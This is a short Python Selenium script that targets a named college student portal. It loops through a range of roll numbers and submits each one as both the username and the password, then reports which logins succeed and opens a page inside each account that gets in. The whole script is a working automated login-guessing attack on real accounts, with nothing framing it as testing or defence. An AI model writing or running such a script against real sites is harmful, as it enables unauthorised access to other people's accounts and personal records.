from selenium import webdriver
import time

driver = webdriver.Chrome("/Users/shreyas_rl/Desktop/git/Selenium-Python/chromedriver")

driver.get("https://sp.fcrit.ac.in/studentportal/index.php")
time.sleep(5)

roll = 101701

invalid = driver.find_element_by_xpath("//*[@id='demo']")
print(invalid.is_displayed())

while roll != 101778:
	driver.find_element_by_xpath("/html/body/div[2]/form/center[1]/input[1]").clear()
	driver.find_element_by_xpath("/html/body/div[2]/form/center[1]/input[1]").send_keys(str(roll))
	time.sleep(2)
	driver.find_element_by_xpath("/html/body/div[2]/form/center[1]/input[2]").clear()
	driver.find_element_by_xpath("/html/body/div[2]/form/center[1]/input[2]").send_keys(str(roll))
	time.sleep(1)
	driver.find_element_by_xpath("/html/body/div[2]/form/center[2]/input").click()
	time.sleep(2)
	if driver.current_url == "https://sp.fcrit.ac.in/studentportal/index.php":  # Use Title Instead.
		print("Not Succesful : ",roll)
	else:
		time.sleep(1)
		driver.find_element_by_xpath("//*[@id='nav-navbar-collapse-1']/ul/li[2]/a").click()
		time.sleep(2)
		print(str(roll) + " Succesful ")

	roll += 1
	time.sleep(2)